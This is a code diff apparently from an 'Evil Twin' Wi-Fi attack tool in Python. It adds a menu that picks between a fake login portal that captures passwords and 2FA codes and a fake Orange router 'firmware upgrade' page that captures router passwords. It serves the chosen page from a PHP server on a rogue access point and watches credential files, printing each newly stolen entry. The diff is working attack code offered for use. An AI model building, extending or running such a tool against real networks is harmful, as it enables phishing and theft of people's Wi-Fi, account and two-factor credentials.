@@ -281,46 +281,66 @@ def createDir(currentDir, accessPointName):
 """ Read files for ETwin Attack """
 
 
-def read_file(attack_type):
+def read_file(attack_type, template_type):
     if attack_type == "newAccessPoint":
-        with open("./ETwin-templates/login-temp/users-creds.txt", "r") as f:
-            readFile_user = f.readlines()
-        with open("./ETwin-templates/login-temp/portal_2fa/2fa.txt", "r") as f:
-            readFile_2fa = f.readlines()
-        return readFile_user, readFile_2fa
+        if template_type == "A":
+            with open("./ETwin-templates/login-temp/users-creds.txt", "r") as f:
+                readFile_user = f.readlines()
+            with open("./ETwin-templates/login-temp/portal_2fa/2fa.txt", "r") as f:
+                readFile_2fa = f.readlines()
+            return readFile_user, readFile_2fa
+        elif template_type == "B":
+            with open("./ETwin-templates/orange-firmware-upgrade/router-pass.txt", "r") as f:
+                readFile_user = f.readlines()
+            return readFile_user
     else:
         with open("./ETwin-templates/orange-firmware-upgrade/router-pass.txt", "r") as f:
             readFile_user = f.readlines()
         return readFile_user
 
 
-def getCredentials(attack_type):
+def getCredentials(attack_type, template_type):
     if attack_type == "newAccessPoint":
-        initial_user, initial_2fa = read_file(attack_type)
-        while True:
-            current_user, current_2fa = read_file(attack_type)
-            if initial_user != current_user:
-                print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
-                print(Fore.WHITE)
-                for line in current_user:
-                    print(line)
-                print(Fore.WHITE)
-                print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
 
-                initial_user = current_user
+        if template_type == "A":
+            initial_user, initial_2fa = read_file(attack_type, template_type)
+            while True:
+                current_user, current_2fa = read_file(attack_type, template_type)
+                if initial_user != current_user:
+                    print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
+                    print(Fore.WHITE)
+                    for line in current_user:
+                        print(line)
+                    print(Fore.WHITE)
+                    print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
 
-            if initial_2fa != current_2fa:
-                print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
-                print(Fore.WHITE)
-                for line in current_2fa:
-                    print(line)
-                print(Fore.WHITE)
-                print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
-                initial_2fa = current_2fa
+                    initial_user = current_user
+
+                if initial_2fa != current_2fa:
+                    print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
+                    print(Fore.WHITE)
+                    for line in current_2fa:
+                        print(line)
+                    print(Fore.WHITE)
+                    print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
+                    initial_2fa = current_2fa
+        elif template_type == "B":
+            initial_user = read_file(attack_type, template_type)
+            while True:
+                current_user = read_file(attack_type, template_type)
+                if initial_user != current_user:
+                    print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
+                    print(Fore.WHITE)
+                    for line in current_user:
+                        print(line)
+                    print(Fore.WHITE)
+                    print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
+
+                    initial_user = current_user
     else:
-        initial_user = read_file(attack_type)
+        initial_user = read_file(attack_type, template_type)
         while True:
-            current_user = read_file(attack_type)
+            current_user = read_file(attack_type, template_type)
             if initial_user != current_user:
                 print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
                 print(Fore.WHITE)
@@ -552,6 +572,13 @@ def attack_func(network_interface, attack_mode):
                 verify_option = False
 
         if get_attack_type == "A":
+
+            get_colours(f"\t[A] Basic Mode", "blue")
+            get_colours(f"\t[B] Firmware Update", "blue")
+            template_type = input(Fore.YELLOW + "Options (A/B): " + Fore.WHITE)
+
+
+
             subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
             access_name = input(Fore.YELLOW + "Access point name to use: "  + Fore.WHITE)
             access_channel = input(Fore.YELLOW + "Channel number: "  + Fore.WHITE)
@@ -588,10 +615,16 @@ def attack_func(network_interface, attack_mode):
             print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Starting PHP Server...'}")
             time.sleep(3)
             print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + ' [!] Press CTRL+C to stop the attack.'}")
-            php_server = os.system(f"cd ETwin-templates/orange-firmware-upgrade;xterm -hold -e sudo php -S 192.168.1.1:80 &")
+
+            if template_type == "B":
+                php_server = os.system(f"cd ETwin-templates/orange-firmware-upgrade;xterm -hold -e sudo php -S 192.168.1.1:80 &")
+            elif template_type == "A":
+                php_server = os.system(f"cd ETwin-templates/login-temp;xterm -hold -e sudo php -S 192.168.1.1:80 &")
+
+
             print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Waiting for Credentials..'}")
             print(Fore.WHITE)
-            getCredentials("newAccessPoint")
+            getCredentials("newAccessPoint", template_type)
             # Killing all the process.
             process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
             out, err = process1.communicate()
